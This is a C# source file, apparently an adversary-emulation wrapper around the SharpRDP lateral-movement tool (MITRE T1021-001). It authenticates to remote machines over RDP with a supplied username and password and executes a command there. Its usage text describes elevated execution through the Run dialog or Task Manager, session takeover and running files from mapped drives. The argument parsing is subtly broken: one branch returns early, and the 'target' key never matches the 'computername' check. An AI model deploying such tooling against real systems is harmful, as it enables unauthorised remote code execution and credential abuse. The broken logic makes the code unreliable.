using System;
using System.IO.Compression;
using System.Reflection;
using System.Collections.Generic;
using System.IO;

/*
    * 
    * T1021-001 (RDP).
    *
    * Possible Parameters:
    *   1 - target - Required
    *       Targeted machine to connect via RDP.
    *
    *   2 - user - Required
    *       Username to be sent to the targeted machine during authentication.
    *
    *   3 - password - Required
    *       Password to be sent to the targeted machine during authentication.
    *
    *   4 - method - Required
    *       Execution method to be used after authenticating. cmd, powershell, winr and taskmgr.
    *
    *   5 - authentication - Required
    *       Desired authentication method, either Local or NLA.
    *
    *   6 - command - Required
    *       Command to be executed on the target machine.
    *       
*/


class Technique
{

    public static Dictionary<string, string> EntryData { get; set; }
    public static Dictionary<string, string> ExitData { get; set; }

    static void HowTo()
    {
        Console.WriteLine("SharpRDP");
        Console.WriteLine("");
        Console.WriteLine("  Regular RDP Connection");
        Console.WriteLine("    SharpRDP.exe computername=domain.target command=\"C:\\Temp\\file.exe\" username=domain\\user password=password");
        Console.WriteLine("  Exec as child process of cmd or ps ");
        Console.WriteLine("    SharpRDP.exe computername=domain.target command=\"C:\\Temp\\file.exe\" username=domain\\user password=password exec=cmd");
        Console.WriteLine("  Use restricted admin mode");
        Console.WriteLine("    SharpRDP.exe computername=domain.target command=\"C:\\Temp\\file.exe\"");
        Console.WriteLine("  Connect first host drives");
        Console.WriteLine("    SharpRDP.exe computername=domain.target command=\"\\\\tsclient\\C\\Temp\\file.exe\" username=domain\\user password=password connectdrive=true");
        Console.WriteLine("  Ask to take over RDP session if another used is logged in (workstation)");
        Console.WriteLine("    SharpRDP.exe computername=domain.target command=\"C:\\Temp\\file.exe\" username=domain\\user password=password takeover=true");
        Console.WriteLine("  Network level authentication");
        Console.WriteLine("    SharpRDP.exe computername=domain.target command=\"C:\\Temp\\file.exe\" username=domain\\user password=password nla=true");
        Console.WriteLine("  Execute command elevated through Run Dialog");
        Console.WriteLine("    SharpRDP.exe computername=domain.target command=\"C:\\Temp\\file.exe\" username=domain\\user password=password elevated=winr");
        Console.WriteLine("  Execute command elevated through task manager");
        Console.WriteLine("    SharpRDP.exe computername=domain.target command=\"C:\\Temp\\file.exe\" username=domain\\user password=password elevated=taskmgr");
    }
    public static void Main(string[] args)
    {
        AppDomain.CurrentDomain.AssemblyResolve += (sender, argtwo) => {
            Assembly thisAssembly = Assembly.GetEntryAssembly();
            String resourceName = string.Format("SharpRDP.{0}.dll.bin",
                new AssemblyName(argtwo.Name).Name);
            var assembly = Assembly.GetExecutingAssembly();
            using (var rs = assembly.GetManifestResourceStream(resourceName))
            using (var zs = new DeflateStream(rs, CompressionMode.Decompress))
            using (var ms = new MemoryStream())
            {
                zs.CopyTo(ms);
                return Assembly.Load(ms.ToArray());
            }
        };

        var arguments = new Dictionary<string, string>();

        if (args.Length != 6)
        {
            Console.WriteLine("Wrong ammount of parameters received, returning with no execution");
            return;
        }
        for (int i = 0; i < args.Length; i++){
            if (i == 0){
                arguments["target"] = args[i];
            }
            else{
                if (i == 1){
                    arguments["username"] = args[i];
                }
                else{
                    if (i == 2){
                        arguments["password"] = args[i];
                    }
                    else{
                        if (i == 3){
                            switch (args[i]){
                                case "cmd":
                                    arguments["exec"] = "cmd";
                                    return;
                                case "powershell":
                                    arguments["exec"] = "powershell";
                                    return;
                                case "winr":
                                    arguments["elevated"] = "winr";
                                    return;
                                case "taskmgr":
                                    arguments["elevated"] = "taskmgr";
                                    return;
                            }
                        }
                        else{
                            if (i == 4){
                                if (args[i] == "nla"){
                                    arguments["nla"] = "true";
                                }
                            }
                            else{
                                if (i == 5){
                                    arguments["command"] = args[i];
                                }
                            }
                        }
                    }
                }
            }
        }

        string username = string.Empty;
        string domain = string.Empty;
        string password = string.Empty;
        string command = string.Empty;
        string execElevated = string.Empty;
        string execw = "";
        bool connectdrive = false;
        bool takeover = false;
        bool nla = false;
            
        if (arguments.ContainsKey("username")){
            if (!arguments.ContainsKey("password")){
                Console.WriteLine("[X] Error: A password is required");
                return;
            }
            else
            {
                if (arguments["username"].Contains("\\"))
                {
                    string[] tmp = arguments["username"].Split('\\');
                    domain = tmp[0];
                    username = tmp[1];
                }
                else
                {
                    domain = ".";
                    username = arguments["username"];
                }
                password = arguments["password"];
            }
        }

        if (arguments.ContainsKey("password") && !arguments.ContainsKey("username"))
        {
            Console.WriteLine("[X] Error: A username is required");
            return;
        }
        if ((arguments.ContainsKey("computername")) && (arguments.ContainsKey("command")))
        {
            Client rdpconn = new Client();
            command = arguments["command"];
            if (arguments.ContainsKey("exec"))
            {
                if (arguments["exec"].ToLower() == "cmd")
                {
                    execw = "cmd";
                }
                else if (arguments["exec"].ToLower() == "powershell" || arguments["exec"].ToLower() == "ps")
                {
                    execw = "powershell";
                }
            }
            if (arguments.ContainsKey("elevated"))
            {
                if(arguments["elevated"].ToLower() == "true" || arguments["elevated"].ToLower() == "win+r" || arguments["elevated"].ToLower() == "winr")
                {
                    execElevated = "winr";
                }
                else if(arguments["elevated"].ToLower() == "taskmgr" || arguments["elevated"].ToLower() == "taskmanager")
                {
                    execElevated = "taskmgr";
                }
                else
                {
                    execElevated = string.Empty;
                }
            }
            if (arguments.ContainsKey("connectdrive"))
            {
                if(arguments["connectdrive"].ToLower() == "true")
                {
                    connectdrive = true;
                }
            }
            if (arguments.ContainsKey("takeover"))
            {
                if (arguments["takeover"].ToLower() == "true")
                {
                    takeover = true;
                }
            }
            if (arguments.ContainsKey("nla"))
            {
                if (arguments["nla"].ToLower() == "true")
                {
                    nla = true;
                }
            }
            string[] computerNames = arguments["computername"].Split(',');
            foreach (string server in computerNames)
            {
                rdpconn.CreateRdpConnection(server, username, domain, password, command, execw, execElevated, connectdrive, takeover, nla);
            }
        }
        else
        {
            HowTo();
            return;
        }

    }
}
